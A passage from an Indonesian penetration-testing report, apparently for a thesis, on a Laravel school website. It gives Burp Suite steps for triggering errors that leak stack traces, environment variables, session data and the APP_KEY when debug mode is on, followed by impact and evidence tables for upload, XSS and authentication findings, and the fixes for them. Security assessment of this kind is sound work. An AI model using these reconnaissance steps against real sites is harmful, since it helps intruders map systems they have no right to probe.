2. Atau buat request khusus untuk trigger exception:
    - Akses route dengan parameter salah tipe: `/user/abc` (jika route expect integer ID)

**Langkah 4: Intercept Error Response dengan Burp**

1. Sebelum navigate URL error di browser, aktifkan Burp Interceptor
2. Kirim request GET ke URL yang akan error:
    ```
    GET /test-404 HTTP/1.1
    Host: localhost:8000
    ```
3. Request akan di-pause di Burp

**Langkah 5: Lihat Response Error Page**

1. Klik "Forward" atau "Send" untuk melihat response
2. Response akan menampilkan Laravel error page yang very detailed:

    ```
    HTTP/1.1 404 Not Found
    Content-Type: text/html; charset=UTF-8

    [HTML Error Page dengan]:
    - Exception type: NotFoundHttpException
    - File path: /app/Http/Routes/web.php
    - Line number: 45
    - Stack trace dengan semua function calls
    - Environment variables dump
    - Session data
    - Request headers
    - Query parameters dll
    ```

**Langkah 6: Analyze Information Disclosure**

1. Di error page, Anda bisa melihat:
    - **Folder structure**: `/var/www/html/app/...`
    - **File paths**: `/home/user/laragon/www/Web-SMP-Islam-Baabussalaam/...`
    - **Database config**: Database name, possibly host if exposed
    - **Framework version**: Laravel version 12.x
    - **Installed packages**: PHP dan list vendor packages
    - **Server info**: PHP version, OS, Web server
    - **Session data**: `$_SESSION` variable dump
    - **Cookie values**: semua cookies ditampilkan
    - **Environment**: APP_KEY bisa terlihat

**Langkah 7: Test Database Error Disclosure**

1. Trigger database error:
    - Akses halaman yang query ke database dengan condition salah
    - Misalnya: akses `/user/abc` dimana system coba query `SELECT * FROM users WHERE id='abc'`
2. Error page akan menampilkan SQL query yang dijalankan:
    ```
    SQL Error: SQLSTATE[HY000]: 1-3: column can't be cast to integer
    Query: SELECT * FROM users WHERE id = 'abc'
    ```
3. Ini exposure detail database structure dan queries

**Langkah 8: Burp Repeater Testing**

1. Buat berbagai request yang akan trigger error:
    ```
    GET /admin/berita/abc
    GET /api/users/xyz
    GET /invalid-route
    ```
2. Intercept setiap response dan lihat debugging information yang di-expose

**Langkah 9: Session Data Exposure**

1. Di error page, jika ada session data dump, bisa lihat:
    - Session ID
    - User ID
    - User roles
    - Temporary data
2. Ini bisa digunakan attacker untuk mapping admin atau user privileges

**Langkah 10: Stack Trace Analysis**

1. Di error page, stack trace menunjukkan:
    ```
    #0 {main}
    #1 /app/Http/Controllers/UserController.php(45): App\Models\User::find()
    #2 /routes/web.php(38): Route handler
    ```
2. Attacker bisa memetakan exact code flow dan logic dari aplikasi

**Langkah 11: Trigger Whoops Error Handler**

1. Laravel dengan debug mode menggunakan "Whoops" error handler
2. Error page berisi:
    - Breadcrumbs (file path trail)
    - Code snippet dengan line highlighting
    - Local variables dump
    - Source code preview
3. Semua informasi ini membantu attacker understand code structure

**Langkah 12: Test Multiple Error Types**

1. Trigger berbagai jenis error:
    - 404 (not found)
    - 500 (server error)
    - 403 (forbidden - jika ada auth check)
    - Database errors
    - Validation errors
2. Setiap jenis error akan expose informasi berbeda

**Langkah 13: Compare dengan Production Settings**

1. Jika bisa akses production/staging di environment lain:
    ```env
    APP_ENV=production
    APP_DEBUG=false
    ```
2. Maka error page akan simple:
    ```
    Oops! Something went wrong.
    ```
3. Tanpa detail internal, attacker tidak bisa gather reconnaissance info

**Langkah 14: Burp Scanner untuk CI Leakage**

1. Bisa juga gunakan Burp Scanner untuk audit:
    - Kirim HTTP request ke Burp Scanner
    - Scanner akan secara otomatis detect information disclosure dari response
    - Report akan menunjukkan "Information Disclosure" findings

**Hasil Vulnerability**:

- Debug mode aktif (APP_DEBUG=true) menyebabkan error page menampilkan detailed information
- Setiap error/exception akan expose:
    - Folder structure dan file paths
    - Database configuration dan queries
    - Framework version dan dependencies
    - Environment variables
    - Session data dan cookies
    - Code stack trace dan logic flow
- Attacker bisa collect intelligence untuk planning serangan lebih targeted
- Information disclose ini memperpendek reconnaissance phase untuk attacker
- V-13 terbukti valid: Debug mode aktif = Information Disclosure vulnerability (Medium severity)

#### Dampak Jika Dibiarkan

- Attacker lebih mudah memetakan struktur aplikasi.
- Informasi internal dapat dipakai untuk serangan lanjutan.
- Risiko kebocoran metadata server meningkat.

#### Mitigasi Before-After

Before:

```env
APP_ENV=local
APP_DEBUG=true
```

After:

```env
APP_ENV=production
APP_DEBUG=false
```

## 5. Tabel Analisis Dampak

| ID   | Dampak Utama                | Jika Dibiarkan                                     |
| ---- | --------------------------- | -------------------------------------------------- |
| V-01 | Integritas file publik      | File berbahaya bisa tersimpan di webroot           |
| V-02 | Integritas file publik      | Foto/staff file bisa disalahgunakan                |
| V-03 | Integritas file publik      | Folder fasilitas menjadi media serangan            |
| V-04 | Integritas file publik      | Upload gallery bisa jadi vektor payload            |
| V-05 | Integritas data berita      | Status berita bisa diubah tanpa kontrol yang tepat |
| V-06 | Confidentiality             | Akun bisa di-bruteforce                            |
| V-07 | Confidentiality             | Password lemah mudah ditebak                       |
| V-08 | Confidentiality / Integrity | Pengunjung dapat terkena stored XSS                |
| V-09 | Confidentiality / Integrity | Pengunjung dapat terkena stored XSS                |
| V-10 | Confidentiality / Integrity | Admin panel dapat diserang lewat DOM XSS           |
| V-11 | Confidentiality / Integrity | Admin panel dapat diserang lewat DOM XSS           |
| V-12 | Confidentiality / Integrity | Preview fasilitas dapat dieksploitasi              |
| V-13 | Confidentiality             | Informasi internal terekspos lewat error           |

## 6. Tabel Evidence yang Disarankan untuk Screenshot

| ID   | Screenshot 1         | Screenshot 2           | Screenshot 3            | Screenshot 4 |
| ---- | -------------------- | ---------------------- | ----------------------- | ------------ |
| V-01 | Kode upload news     | Request Burp           | File tersimpan          | Snippet fix  |
| V-02 | Kode upload teacher  | Request Burp           | File tersimpan          | Snippet fix  |
| V-03 | Kode upload facility | Request Burp           | File tersimpan          | Snippet fix  |
| V-04 | Kode upload gallery  | Request Burp           | File tersimpan          | Snippet fix  |
| V-05 | Route GET toggle     | Request GET            | Status berubah          | Snippet fix  |
| V-06 | Kode login           | Intruder               | Tanpa lockout           | Snippet fix  |
| V-07 | Password policy      | Request create user    | Password lemah diterima | Snippet fix  |
| V-08 | Blade raw output     | Request simpan payload | Alert XSS               | Snippet fix  |
| V-09 | Blade raw output     | Request simpan payload | Alert XSS               | Snippet fix  |
| V-10 | JS preview           | Payload tersimpan      | Alert DOM XSS           | Snippet fix  |
| V-11 | JS preview           | Payload tersimpan      | Alert DOM XSS           | Snippet fix  |
| V-12 | JS preview           | Payload tersimpan      | Alert DOM XSS           | Snippet fix  |
| V-13 | `.env` debug         | Error response         | Stack trace             | Snippet fix  |

## 7. Kesimpulan

Temuan paling kuat pada target ini ada pada tiga area utama: keamanan file upload, XSS, dan kontrol autentikasi. Untuk kebutuhan proposal skripsi, struktur laporan ini sudah sesuai untuk dijadikan dasar pembahasan asesmen, validasi PoC, edukasi dampak, dan mitigasi before-after.

Jika ingin dibawa ke tahap implementasi, prioritas perbaikan paling tinggi adalah:

1. Menutup file upload yang masih berisiko.
2. Menghapus semua output raw dan `innerHTML` yang berasal dari data user.
3. Menambahkan rate limiting dan password policy yang lebih kuat.
4. Mematikan debug mode pada lingkungan selain lokal.
